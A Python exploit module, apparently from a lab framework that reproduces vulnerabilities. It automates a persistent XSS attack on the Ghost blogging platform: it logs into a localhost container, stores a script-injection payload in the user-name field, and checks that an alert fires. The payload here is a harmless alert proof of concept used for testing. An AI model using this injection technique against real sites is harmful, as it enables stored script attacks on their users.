__author__ = 'root'

from selenium.webdriver.common.by import By
from data.exploits.framework.BasicExploit import BasicExploit


class Exploit(BasicExploit):

    attributes = {
      'Name' :        'Ghost_User_Title',
      'Description' : "Insert a malformed input in the name of the user and store it in the database",
      'References' :  [["EMPTY"]],
      'Target' :      "Ghost",
      'Container': 'ubuntu-node',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'Persistent XSS'
    }

    def runExploit(self):
        ghost = self.wrapper
        ghost.navigate("http://localhost:49160/ghost")
        ghost.find("email").keys("author@lab.com")
        ghost.find("password").keys("qwertyqwerty")
        ghost.find("button.btn.btn-blue").click()

        ghost.find("name").click()
        ghost.find("Your Profile").click()

        ghost.find("user-name").clear()
        ghost.find("user-name").keys("''><script></script><script>alert('xss')</script>")
        ghost.find("button.btn.btn-blue").click()

        ghost.find("name").click()
        ghost.find("Sign Out").click()

        ghost.navigate("http://localhost:49160/sdadsa/")

        alert_text = ghost.handle_alert()
        self.assertIn("xss", alert_text, "Exploit didn't work!")




